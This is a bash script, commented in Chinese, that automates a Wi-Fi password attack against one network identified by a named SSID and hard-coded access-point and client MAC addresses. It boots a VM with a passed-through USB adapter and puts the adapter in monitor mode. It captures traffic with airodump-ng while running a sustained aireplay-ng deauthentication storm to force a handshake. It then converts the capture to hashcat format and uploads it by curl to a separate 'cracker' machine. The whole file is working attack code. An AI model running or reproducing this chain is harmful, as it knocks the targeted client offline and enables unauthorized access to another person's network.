#!/bin/bash
# mac_oneshot_capture.sh — 一鍵：開 runner VM → 唯一一次 airodump 會話 → 轉 .hc22000 → POST Windows :8766
# 前提：Mac 剛重啟過（DWA-160 為本次 boot 首次使用）；~/vmbuild 存在
set -u
B=$HOME/vmbuild
VSSH="ssh -i $HOME/.ssh/vm_tongbao -p 2222 -o ConnectTimeout=10 -o ServerAliveInterval=20 -o ServerAliveCountMax=120 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o BatchMode=yes root@127.0.0.1"
WIN="http://192.168.1.107:8766/api/receive-hash"
SSID=32H10F
AP=bc:3e:07:01:dc:98
CLIENT=BC:61:93:23:BC:3F
LOG=/tmp/cap_${SSID}.log
exec > >(tee -a $LOG) 2>&1

log(){ echo "[$(date '+%H:%M:%S')] $*"; }
log "===== ONESHOT CAPTURE START ($SSID) ====="

# 0) kill any stale VM
pkill -f qemu-system-aarch64 2>/dev/null; sleep 4

# 1) start runner VM (first VM of this Mac boot = good DWA-160 RX window)
rm -f /tmp/runner_serial.log
nohup /opt/homebrew/bin/qemu-system-aarch64 -machine virt -cpu cortex-a72 -m 4096 -smp 4 \
  -drive file=$B/alpine-root.qcow2,format=qcow2 \
  -kernel $B/vmbuild/boot/vmlinuz-lts -initrd $B/vmbuild/runner-initrd -append "console=ttyAMA0" \
  -chardev file,id=s0,path=/tmp/runner_serial.log,append=on -serial chardev:s0 \
  -netdev user,id=n0,hostfwd=tcp:127.0.0.1:2222-10.0.2.15:22 \
  -device virtio-net-pci,netdev=n0 \
  -device qemu-xhci,id=xhci -device usb-host,bus=xhci.0,vendorid=0x148f,productid=0x5572 \
  -display none -monitor unix:/tmp/vm_app_monitor.sock,server,nowait >/dev/null 2>&1 &
QPID=$!
log "runner qemu pid=$QPID"

# 2) wait for guest sshd
up=0
for i in $(seq 1 30); do sleep 10
  if $VSSH "true" 2>/dev/null; then up=1; log "guest ssh up ~$((i*10))s"; break; fi
done
[ $up -eq 1 ] || { log "FAIL: guest ssh not up"; exit 2; }

# 3) wait firmware
FW=0
for i in $(seq 1 24); do FW=$($VSSH "dmesg | grep -c 'Firmware detected'" 2>/dev/null); [ "${FW:-0}" -ge 1 ] 2>/dev/null && break; sleep 5; done
log "firmware count=$FW"

# 4) monitor mode (down -> set type -> up)
$VSSH 'mount --bind /proc /newroot/proc 2>/dev/null; mount --bind /sys /newroot/sys 2>/dev/null; mount --bind /dev /newroot/dev 2>/dev/null
ifconfig wlan0 down 2>&1; sleep 2
chroot /newroot /usr/sbin/iw dev wlan0 set type monitor 2>&1
ifconfig wlan0 up 2>&1
echo MON_SET_OK' 2>&1 | tail -3

# 5) THE one airodump session + aireplay deauth storm (run ~11 min, never kill airodump)
$VSSH 'rm -f /newroot/tmp/cap32h10f* /newroot/tmp/airo_on.log /newroot/tmp/aireplay_on.log
nohup chroot /newroot /usr/bin/airodump-ng wlan0 -c 1 -w /tmp/cap32h10f > /newroot/tmp/airo_on.log 2>&1 &
AIRO=$!
sleep 25
S1=$(ls -la /newroot/tmp/cap32h10f-01.cap 2>/dev/null | awk "{print \$5}")
echo "first25s=${S1:-0} AIRO=$AIRO"
if [ "${S1:-0}" -gt 3000 ]; then
  nohup chroot /newroot /usr/bin/aireplay-ng --deauth 9999 --ignore-negative-one -a bc:3e:07:01:dc:98 -c BC:61:93:23:BC:3F wlan0 > /newroot/tmp/aireplay_on.log 2>&1 &
  echo "aireplay started"
  sleep 600
else
  echo "WARN: no RX in first 25s; still waiting 10min in case of slow firmware"
  sleep 600
fi
S2=$(ls -la /newroot/tmp/cap32h10f-01.cap 2>/dev/null | awk "{print \$5}")
echo "final_cap_bytes=${S2:-0}"
echo "--- csv AP/client lines ---"
grep -iE "$SSID|$AP" /newroot/tmp/cap32h10f-01.csv 2>/dev/null | head -5
echo "--- airodump tail ---"
tail -15 /newroot/tmp/airo_on.log 2>/dev/null
echo CAP_SEQ_DONE' 2>&1 | tail -25

# 6) convert .cap -> .hc22000 (hcxpcapngtool in guest rootfs), name SSID+date
TS=$(date +%Y%m%d_%H%M)
HC=/tmp/${SSID}_$TS.hc22000
$VSSH "chroot /newroot /usr/local/bin/hcxpcapngtool -o /tmp/cap32h10f-01.hc22000 /tmp/cap32h10f-01.cap 2>&1 | tail -3" 2>&1 | tail -4
scp -i $HOME/.ssh/vm_tongbao -P 2222 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o BatchMode=yes \
  root@127.0.0.1:/tmp/cap32h10f-01.hc22000 $HOME/vmbuild/$HC 2>/dev/null
if [ -s $HOME/vmbuild/$HC ]; then
  log "hc22000 ok: $HOME/vmbuild/$HC ($(stat -f%z $HOME/vmbuild/$HC) bytes)"
  # 7) POST to Windows cracker
  R=$(curl -s -m 30 -F "file=@$HOME/vmbuild/$HC" "$WIN")
  log "POST $WIN -> $R"
else
  log "WARN: no hc22000 produced (capture may have 0 frames)"
fi

# 8) kill VM (window consumed)
pkill -f qemu-system-aarch64 2>/dev/null
log "===== ONESHOT CAPTURE END ====="